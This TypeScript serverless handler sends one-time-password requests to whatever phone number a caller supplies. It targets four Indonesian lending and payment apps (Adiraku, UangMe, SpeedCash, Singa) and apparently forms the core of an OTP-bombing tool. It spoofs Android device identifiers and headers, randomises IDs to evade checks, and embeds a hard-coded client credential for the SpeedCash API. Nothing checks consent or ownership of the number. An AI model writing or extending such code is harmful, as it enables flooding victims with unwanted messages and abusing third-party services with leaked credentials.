import type { VercelRequest, VercelResponse } from '@vercel/node';
import axios from 'axios';

const codex = (length: number) => {
  let result = '';
  const characters = 'abcdef0123456789';
  const charactersLength = characters.length;
  for (let i = 0; i < length; i++) {
    result += characters.charAt(Math.floor(Math.random() * charactersLength));
  }
  return result;
};

export default async function handler(req: VercelRequest, res: VercelResponse) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  const { phoneNumber, service } = req.body;

  try {
    let response;
    let success = false;
    let message = '';

    switch (service) {
      case "adiraku":
        response = await axios.post(
          "https://prod.adiraku.co.id/ms-auth/auth/generate-otp-vdata",
          {
            mobileNumber: phoneNumber,
            type: "prospect-create",
            channel: "whatsapp",
          },
          {
            headers: { "Content-Type": "application/json; charset=utf-8" },
            timeout: 8000,
          }
        );
        success = response.data.message === "success";
        message = success ? "Adiraku OTP Sent" : `Adiraku Error: ${JSON.stringify(response.data)}`;
        break;

      case "uangme":
        response = await axios.get(
          `https://api.uangme.com/api/v2/sms_code?phone=${phoneNumber}&scene_type=login&send_type=wp`,
          {
            headers: {
              'aid': `gaid_15497a9b-2669-42cf-ad10-${codex(12)}`,
              'android_id': 'b787045b140c631f',
              'app_version': '300504',
              'brand': 'samsung',
              'carrier': '00',
              'Content-Type': 'application/x-www-form-urlencoded',
              'country': '510',
              'dfp': '6F95F26E1EEBEC8A1FE4BE741D826AB0',
              'fcm_reg_id': 'frHvK61jS-ekpp6SIG46da:APA91bEzq2XwRVb6Nth9hEsgpH8JGDxynt5LyYEoDthLGHL-kC4_fQYEx0wZqkFxKvHFA1gfRVSZpIDGBDP763E8AhgRjDV7kKjnL-Mi4zH2QDJlsrzuMRo',
              'gaid': 'gaid_15497a9b-2669-42cf-ad10-d0d0d8f50ad0',
              'lan': 'in_ID',
              'model': 'SM-G965N',
              'ns': 'wifi',
              'os': '1',
              'timestamp': Math.floor(Date.now() / 1000).toString(),
              'tz': 'Asia/Bangkok',
              'User-Agent': 'okhttp/3.12.1',
              'v': '1',
              'version': '28'
            },
            timeout: 8000,
          }
        );
        success = response.data.code === "200";
        message = success ? "UangMe OTP Sent" : `UangMe Error: ${JSON.stringify(response.data)}`;
        break;

      case "speedcash":
        const tokenResponse = await axios.post(
          "https://sofia.bmsecure.id/central-api/oauth/token",
          "grant_type=client_credentials",
          {
            headers: {
              'Authorization': 'Basic NGFiYmZkNWQtZGNkYS00OTZlLWJiNjEtYWMzNzc1MTdjMGJmOjNjNjZmNTZiLWQwYWItNDlmMC04NTc1LTY1Njg1NjAyZTI5Yg==',
              'Content-Type': 'application/x-www-form-urlencoded'
            },
            timeout: 8000,
          }
        );
        const accessToken = tokenResponse.data.access_token;

        response = await axios.post(
          "https://sofia.bmsecure.id/central-api/sc-api/otp/generate",
          {
            version_name: "6.2.1 (428)",
            phone: phoneNumber,
            appid: "SPEEDCASH",
            version_code: 428,
            location: "0,0",
            state: "REGISTER",
            type: "WA",
            app_id: "SPEEDCASH",
            uuid: `00000000-4c22-250d-ffff-ffff${codex(8)}`,
            via: "BB ANDROID"
          },
          {
            headers: {
              'Authorization': `Bearer ${accessToken}`,
              'Content-Type': 'application/json'
            },
            timeout: 8000,
          }
        );
        success = response.data.rc === "00";
        message = success ? "SpeedCash OTP Sent" : `SpeedCash Error: ${JSON.stringify(response.data)}`;
        break;

      case "singa":
        response = await axios.post(
          "https://api102.singa.id/new/login/sendWaOtp?versionName=2.4.8&versionCode=143&model=SM-G965N&systemVersion=9&platform=android&appsflyer_id=",
          {
            mobile_phone: phoneNumber,
            type: "mobile",
            is_switchable: 1
          },
          {
            headers: { "Content-Type": "application/json; charset=utf-8" },
            timeout: 8000,
          }
        );
        success = response.data.msg === "Success";
        message = success ? "Singa OTP Sent" : `Singa Error: ${JSON.stringify(response.data)}`;
        break;

      default:
        return res.status(400).json({ error: "Invalid service" });
    }

    res.json({ success, message });
  } catch (error: any) {
    console.error(`Error sending OTP via ${service}:`, error.message);
    res.status(500).json({ 
      success: false, 
      error: error.message,
      details: error.response?.data 
    });
  }
}
